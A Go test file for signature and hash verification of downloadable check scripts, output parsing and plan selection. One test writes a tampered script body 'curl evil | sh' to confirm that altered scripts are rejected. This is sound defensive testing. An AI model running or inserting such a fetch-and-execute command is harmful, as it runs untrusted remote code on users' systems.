package main

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"strings"
	"testing"
)

// Same literal as lib/rules-advanced.test.ts asserts for canonicalJson.
const wantPayload = `{"body":{"language":"sh","sha256":"` + "aa" + `"},"id":"probe","version":2}`

func signed(t *testing.T, body string) (*checkScript, string) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	der, _ := x509.MarshalPKIXPublicKey(pub)
	sum := sha256.Sum256([]byte(body))
	m := checkMeta{ID: "probe", Version: 1, Language: "sh", Sha256: hex.EncodeToString(sum[:]), Bytes: len(body)}
	m.Signature = base64.StdEncoding.EncodeToString(ed25519.Sign(priv, []byte(checkPayload(m))))
	return &checkScript{meta: m, body: []byte(body)}, base64.StdEncoding.EncodeToString(der)
}

func TestCheckPayloadIsCanonical(t *testing.T) {
	got := checkPayload(checkMeta{ID: "probe", Version: 2, Language: "sh", Sha256: "aa"})
	if got != wantPayload {
		t.Fatalf("got %s", got)
	}
}

func TestVerifyCheck(t *testing.T) {
	c, key := signed(t, "echo hi\n")
	if err := verifyCheck(c, key); err != nil {
		t.Fatalf("valid script refused: %v", err)
	}
	if err := verifyCheck(c, ""); err == nil {
		t.Fatal("ran without an embedded key")
	}
	tampered := *c
	tampered.body = []byte("curl evil | sh\n")
	if err := verifyCheck(&tampered, key); err == nil {
		t.Fatal("tampered body accepted")
	}
	rehashed := tampered
	sum := sha256.Sum256(rehashed.body)
	rehashed.meta.Sha256 = hex.EncodeToString(sum[:])
	if err := verifyCheck(&rehashed, key); err == nil {
		t.Fatal("re-hashed body accepted without a new signature")
	}
	_, other := signed(t, "echo hi\n")
	if err := verifyCheck(c, other); err == nil {
		t.Fatal("signature from another key accepted")
	}
	bumped := *c
	bumped.meta.Version = 2
	if err := verifyCheck(&bumped, key); err == nil {
		t.Fatal("version replay accepted")
	}
}

func TestReadCheckSplitsBody(t *testing.T) {
	c, _ := signed(t, "echo hi\n")
	meta, _ := json.Marshal(c.meta)
	got, err := readCheck(base64.RawURLEncoding.EncodeToString(meta), strings.NewReader("echo hi\nTARBALL"))
	if err != nil || string(got.body) != "echo hi\n" {
		t.Fatalf("got %q %v", got, err)
	}
	big := c.meta
	big.Bytes = maxCheckScript + 1
	meta, _ = json.Marshal(big)
	if _, err := readCheck(base64.RawURLEncoding.EncodeToString(meta), strings.NewReader("")); err == nil {
		t.Fatal("oversized script accepted")
	}
}

func TestParseCheckOutput(t *testing.T) {
	out := strings.Join([]string{
		`{"finding":{"id":"canary-read","severity":"critical","lines":["a","b","c","d","e","f"]}}`,
		`not json`,
		`{"finding":{"id":"Bad Id","severity":"high","lines":[]}}`,
		`{"finding":{"id":"ok","severity":"catastrophic","lines":[]}}`,
		`{"other":true}`,
		`{"finding":{"id":"second","severity":"low"}}`,
	}, "\n")
	got, truncated := parseCheckOutput("probe", strings.NewReader(out))
	if truncated || len(got) != 2 {
		t.Fatalf("got %+v truncated=%v", got, truncated)
	}
	if got[0].Tool != "check:probe" || got[0].RuleID != "canary-read" || got[0].Message != "a | b | c | d | e" {
		t.Fatalf("got %+v", got[0])
	}
	var many strings.Builder
	for i := 0; i < maxCheckFindings+5; i++ {
		many.WriteString(`{"finding":{"id":"x","severity":"low","lines":[]}}` + "\n")
	}
	got, truncated = parseCheckOutput("probe", strings.NewReader(many.String()))
	if len(got) != maxCheckFindings || !truncated {
		t.Fatalf("cap not applied: %d %v", len(got), truncated)
	}
}

func TestPlanFrom(t *testing.T) {
	def := planFrom("")
	if !def.wants("install") || def.wants("check") {
		t.Fatal("default plan wrong")
	}
	p := planFrom("import,check,bogus")
	if p.wants("install") || !p.wants("import") || !p.wants("check") || p.wants("bogus") {
		t.Fatal("explicit plan wrong")
	}
}
